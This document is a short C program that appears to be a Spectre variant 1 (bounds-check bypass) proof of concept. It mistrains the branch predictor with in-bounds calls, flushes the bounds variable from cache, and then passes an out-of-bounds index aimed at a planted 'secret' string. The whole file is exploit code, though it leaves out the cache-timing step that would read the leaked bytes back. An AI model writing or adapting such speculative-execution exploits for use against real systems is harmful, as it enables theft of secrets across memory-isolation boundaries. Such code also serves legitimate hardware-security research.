#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <x86intrin.h>

unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t unused2[64];
uint8_t array2[256 * 512];
char *secret = "CRITICAL_KEY_LEAK";

void victim_function(size_t x) {
    if (x < array1_size) {
        uint8_t val = array2[array1[x] * 512];
    }
}

int main() {
    for (int i = 0; i < sizeof(array2); i++) array2[i] = 1;
    size_t malicious_x = (size_t)(secret - (char*)array1);

    for (int run = 0; run < 1000000; run++) {
        // Mistrain branch predictor with valid inputs
        for (int z = 0; z < 5; z++) {
            _mm_clflush(&array1_size);
            for (volatile int z2 = 0; z2 < 100; z2++) {}
            victim_function(run % 16);
        }
        // Speculatively leak via out-of-bounds index
        _mm_clflush(&array1_size);
        for (volatile int z2 = 0; z2 < 100; z2++) {}
        victim_function(malicious_x);
    }
    return 0;
}
